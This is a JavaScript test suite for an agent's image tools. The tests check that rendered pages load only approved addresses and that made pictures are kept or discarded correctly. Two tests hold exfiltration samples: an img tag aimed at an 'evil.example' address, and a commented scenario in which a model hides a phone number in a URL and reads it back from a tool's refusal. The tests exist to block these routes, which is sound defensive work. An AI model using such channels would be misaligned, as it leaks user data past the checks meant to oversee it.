/**
 * TEX MAKES PICTURES (owner, 2026-10-19): `draw_picture` photographs a page
 * the model wrote, `make_picture` asks Google's image model through the AI
 * Gateway. Both hand back an image block the turn texts like any other.
 *
 * ## Sabotage record
 *
 * Applied, suite run, named check observed failing, reverted.
 *
 *   `allow` built from every address in the page → "a drawn page loads only
 *     addresses the turn read" fails.
 *   keeping a picture made from a tool's picture → "a picture made from a
 *     note's picture is not kept for the next text" fails.
 *   `last-picture` resolving to the made picture alone → "the next edit gets
 *     the last picture and the photo it came from" fails.
 *   route.js not offering `maker.tools` → "a texted turn draws a picture and
 *     texts it back" fails.
 *   `wrap` keeping a result's words whole (`outgoingPictures.js`) → "an
 *     address the model only put in a tool's arguments is never vouched by
 *     the refusal that repeats it" fails.
 */

import assert from "node:assert/strict";
import { test } from "node:test";

import { outgoingPictures } from "../src/agent/outgoingPictures.js";
import { DRAW_TOOL, KEPT_PHOTOS_PATH, KEPT_PICTURE_PATH, MAKE_TOOL, callImageModel, pictureMaker, turnPictures, withPictureMaker } from "../src/agent/pictureMaker.js";

const PNG = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
const GATEWAY = { base: "https://gateway.ai.cloudflare.com/v1/acct/gw", token: "t".repeat(32) };

function memoryStore() {
  const objects = new Map();
  return {
    objects,
    async get(key) {
      return objects.has(key) ? { text: async () => objects.get(key) } : null;
    },
    async put(key, value) {
      objects.set(key, value);
    },
  };
}

function siteShots() {
  const calls = [];
  return {
    calls,
    SITE_SHOTS: {
      async fetch(url, init) {
        const body = JSON.parse(init.body);
        calls.push({ url, body });
        return new Response(JSON.stringify({ png: "RFJBV04=", width: body.width ?? 1080, height: body.height ?? 1080, blocked: [] }), { status: 200 });
      },
    },
  };
}

function imageModel(data = "TUFERQ==") {
  const calls = [];
  const fetchImpl = async (url, init) => {
    calls.push({ url, headers: init.headers, body: JSON.parse(init.body) });
    return new Response(
      JSON.stringify({
        candidates: [{ content: { parts: [{ inlineData: { mimeType: "image/png", data } }] }, finishReason: "STOP" }],
        usageMetadata: { promptTokenCount: 300, candidatesTokenCount: 1120 },
      }),
      { status: 200 },
    );
  };
  return { calls, fetchImpl };
}

const photo = (data, name = "me.jpg") => ({ name, mediaType: "image/jpeg", data });

test("a deployment with neither the screenshot Worker nor a gateway offers no picture tools", () => {
  assert.equal(pictureMaker({}, { outgoing: outgoingPictures({ enabled: true }) }), null);
  const onlyDraw = pictureMaker(siteShots(), { outgoing: outgoingPictures({ enabled: true }) });
  assert.deepEqual(onlyDraw.tools.map((t) => t.name), ["draw_visual", DRAW_TOOL]);
  const both = pictureMaker(siteShots(), { gateway: GATEWAY, outgoing: outgoingPictures({ enabled: true }) });
  assert.deepEqual(both.tools.map((t) => t.name), ["draw_visual", DRAW_TOOL, MAKE_TOOL]);
});

test("a drawn page loads only addresses the turn read, and their photo goes in as data", async () => {
  const shots = siteShots();
  const outgoing = outgoingPictures({ enabled: true, question: "make a poster with https://cdn.example.com/logo.png" });
  const maker = pictureMaker(shots, { attachments: [photo("QUFBQQ==")], outgoing });
  const call = outgoing.wrap(withPictureMaker(maker, async () => assert.fail("not the dispatcher")));
  const html =
    '<img src="attachment:1"><img src="https://cdn.example.com/logo.png">' +
    '<img src="https://evil.example/?q=their-address"><div style="background:url(picture:9)"></div>';
  const result = await call(DRAW_TOOL, { html, width: 1080, height: 1920 });
  const sent = shots.calls[0].body;
  assert.equal(shots.calls[0].url, "https://site-shots/render");
  assert.deepEqual(sent.allow, ["https://cdn.example.com/logo.png"]);
  assert.match(sent.html, /<img src="data:image\/jpeg;base64,QUFBQQ==">/);
  assert.match(sent.html, /url\(picture:9\)/, "a picture that does not exist is left as it was");
  assert.equal(result.content[0].type, "image");
  assert.match(result.content.at(-1).text, /This is picture 1/, "numbered for texting like any picture");
  assert.match(result.content[1].text, /No such picture, left empty: picture:9/);
  assert.match(result.content[1].text, /1 address\(es\) did not load/);
  const { pictures } = outgoing.take("Here.\n[picture 1]");
  assert.equal(pictures[0].data, "RFJBV04=");
});

test("make_picture asks Google's model through the gateway, on its token, with no log and no Google key", async () => {
  const model = imageModel();
  const metered = [];
  const outgoing = outgoingPictures({ enabled: true });
  const maker = pictureMaker({}, {
    gateway: GATEWAY,
    attachments: [photo("UEVSU09O"), photo("RFJFU1M=", "dress.jpg")],
    outgoing,
    store: memoryStore(),
    meter: async (...args) => metered.push(args),
    fetchImpl: model.fetchImpl,
  });
  const result = await maker.call(MAKE_TOOL, { prompt: "Picture 1 is me, picture 2 a dress: me wearing it.", from: ["attachment:1", "attachment:2"], aspect_ratio: "3:4" });
  const [sent] = model.calls;
  assert.equal(sent.url, `${GATEWAY.base}/google-ai-studio/v1beta/models/gemini-2.5-flash-image:generateContent`);
  assert.equal(sent.headers["cf-aig-authorization"], `Bearer ${GATEWAY.token}`);
  assert.equal(sent.headers["cf-aig-collect-log"], "false");
  assert.equal(Object.keys(sent.headers).some((h) => /goog|api-key/i.test(h)), false);
  assert.deepEqual(sent.body.contents[0].parts.map((p) => p.inlineData?.data ?? p.text), ["UEVSU09O", "RFJFU1M=", "Picture 1 is me, picture 2 a dress: me wearing it."]);
  assert.deepEqual(sent.body.generationConfig, { responseModalities: ["TEXT", "IMAGE"], imageConfig: { aspectRatio: "3:4" } });
  assert.deepEqual(result.content[0], { type: "image", data: "TUFERQ==", mimeType: "image/png" });
  assert.deepEqual(metered, [[{ input: 300, output: 1120 }, false, "google/gemini-2.5-flash-image", false]]);
});

test("the next edit gets the last picture and the photo it came from", async () => {
  const store = memoryStore();
  const first = imageModel("RklSU1Q=");
  const makerA = pictureMaker({}, { gateway: GATEWAY, attachments: [photo("UEVSU09O")], outgoing: outgoingPictures({ enabled: true }), store, keep: true, fetchImpl: first.fetchImpl });
  await makerA.call(MAKE_TOOL, { prompt: "me in a red dress", from: ["attachment:1"] });
  assert.ok(store.objects.has(KEPT_PICTURE_PATH));

  // The next text: the photo is no longer attached.
  const second = imageModel("U0VDT05E");
  const makerB = pictureMaker({}, { gateway: GATEWAY, outgoing: outgoingPictures({ enabled: true }), store, keep: true, fetchImpl: second.fetchImpl });
  await makerB.call(MAKE_TOOL, { prompt: "same, now in blue", from: ["last-picture"] });
  assert.deepEqual(second.calls[0].body.contents[0].parts.slice(0, 2).map((p) => p.inlineData.data), ["RklSU1Q=", "UEVSU09O"]);
  const kept = JSON.parse(store.objects.get(KEPT_PICTURE_PATH));
  assert.equal(kept.made.data, "U0VDT05E");
  assert.deepEqual(kept.sources.map((p) => p.data), ["UEVSU09O"], "the original photo stays with it");
});

test("a photo from an earlier text is still there for \"try again\"", async () => {
  // Dev, 2026-10-19: the edit failed, "try again" came next, and Tex asked for the photo again.
  const store = memoryStore();
  const meter = async () => {};
  const env = { AI_GATEWAY_ACCOUNT_ID: "a".repeat(32), AI_GATEWAY_ID: "gw", AI_GATEWAY_TOKEN: "t".repeat(32) };
  const first = await turnPictures(env, { texted: true, question: "make our clothes blue", attachments: [photo("R1JPVVA=")], store, keep: true, meter, workspaceId: "w" });
  assert.ok(first.maker && store.objects.has(KEPT_PHOTOS_PATH), "the photo is kept when it arrives, before any tool runs");

  const model = imageModel();
  const next = pictureMaker({}, { gateway: GATEWAY, outgoing: outgoingPictures({ enabled: true }), store, keep: true, fetchImpl: model.fetchImpl });
  const result = await next.call(MAKE_TOOL, { prompt: "Make their clothes blue.", from: ["earlier-photo:1"] });
  assert.equal(result.content[0].type, "image");
  assert.equal(model.calls[0].body.contents[0].parts[0].inlineData.data, "R1JPVVA=");
  const kept = JSON.parse(store.objects.get(KEPT_PICTURE_PATH));
  assert.deepEqual(kept.sources.map((p) => p.data), ["R1JPVVA="], "and the edit keeps it as the source of the next one");

  // A text that is not kept (the app's own turns) keeps no photo.
  const other = memoryStore();
  await turnPictures(env, { texted: true, question: "x", attachments: [photo("QQ==")], store: other, keep: false, meter, workspaceId: "w" });
  assert.equal(other.objects.has(KEPT_PHOTOS_PATH), false);
});

test("a picture made from a note's picture is not kept for the next text", async () => {
  const store = memoryStore();
  const outgoing = outgoingPictures({ enabled: true });
  await outgoing.wrap(async () => ({ content: [{ type: "image", data: PNG, mimeType: "image/png" }] }))("fetch", {});
  const maker = pictureMaker({}, { gateway: GATEWAY, outgoing, store, keep: true, fetchImpl: imageModel().fetchImpl });
  const result = await maker.call(MAKE_TOOL, { prompt: "make it a watercolor", from: ["picture:1"] });
  assert.equal(result.content[0].type, "image");
  assert.equal(store.objects.has(KEPT_PICTURE_PATH), false);
});

test("an unknown source is refused before any model call, and a refusal is said plainly", async () => {
  const model = imageModel();
  const maker = pictureMaker({}, { gateway: GATEWAY, outgoing: outgoingPictures({ enabled: true }), store: memoryStore(), fetchImpl: model.fetchImpl });
  const missing = await maker.call(MAKE_TOOL, { prompt: "x", from: ["attachment:3"] });
  assert.equal(missing.isError, true);
  assert.equal(model.calls.length, 0);

  const refused = await callImageModel(GATEWAY, "gemini-3.1-flash-lite-image", {}, {
    fetchImpl: async () => new Response(JSON.stringify({ promptFeedback: { blockReason: "SAFETY" } }), { status: 200 }),
  });
  assert.equal(refused.picture, null);
  assert.match(refused.reason, /safety rules/);
  const failed = await callImageModel(GATEWAY, "gemini-3.1-flash-lite-image", {}, {
    fetchImpl: async () => new Response('{"error":{"message":"quoting the prompt: secret"}}', { status: 500 }),
  });
  assert.doesNotMatch(failed.reason, /secret/, "no error body reaches the model");
});

test("a texted turn draws a picture and texts it back", async () => {
  const { createEgressWorld, request, TOKEN_TEXTS } = await import("./agentEgressFixtures.mjs");
  const world = await createEgressWorld();
  try {
    const shots = siteShots();
    const env = { ...world.env, SITE_SHOTS: shots.SITE_SHOTS };
    world.model.install([
      { toolCalls: [{ name: "send", args: { action: DRAW_TOOL, args: { html: "<!doctype html><h1>Party Friday</h1>", width: 1080, height: 1350 } } }] },
      { text: "Here's your invite.\n\n[picture 1]" },
    ]);
    const asked = await request(env, TOKEN_TEXTS, "/agent", { question: "make me an invite for Friday", conversation: "texts" });
    assert.equal(asked.status, 200, JSON.stringify(asked.body));
    assert.equal(asked.body.answer, "Here's your invite.");
    assert.deepEqual(asked.body.pictures, [{ name: "picture-1.png", mediaType: "image/png", data: "RFJBV04=" }]);
    assert.equal(shots.calls[0].body.height, 1350);
    // Shown as two of `send`'s actions, like the browser (`sixTools.js`).
    const offered = JSON.stringify(world.model.requests[0].tools);
    assert.ok(offered.includes(DRAW_TOOL) && offered.includes(MAKE_TOOL), "both tools are offered on a texted turn");
  } finally {
    world.restore();
  }
});

test("an address the model only put in a tool's arguments is never vouched by the refusal that repeats it", async () => {
  const shots = siteShots();
  const model = imageModel();
  const outgoing = outgoingPictures({ enabled: true, question: "draw me a poster" });
  const maker = pictureMaker(shots, { gateway: GATEWAY, outgoing, store: memoryStore(), fetchImpl: model.fetchImpl });
  const call = outgoing.wrap(withPictureMaker(maker, async () => assert.fail("not the dispatcher")));

  // The exfiltration this turn's rules exist to stop: the model writes what it
  // learnt into an address, hands it to a tool that cannot use it, and reads
  // its own words back out of the refusal.
  const planted = "https://e.gg/?d=0415550123";
  const refused = await call(MAKE_TOOL, { prompt: "a poster", from: [planted] });
  assert.equal(refused.isError, true);
  assert.ok(refused.content[0].text.includes(planted), "the refusal does repeat what it was given");
  assert.equal(model.calls.length, 0, "and no picture was made");

  await call(DRAW_TOOL, { html: `<img src="${planted}">` });
  assert.deepEqual(shots.calls.at(-1).body.allow, [], "a drawn page does not load it");
  assert.deepEqual(outgoing.take(`Here.\n[picture ${planted}]`).pictures, [], "and no picture is fetched from it");
});
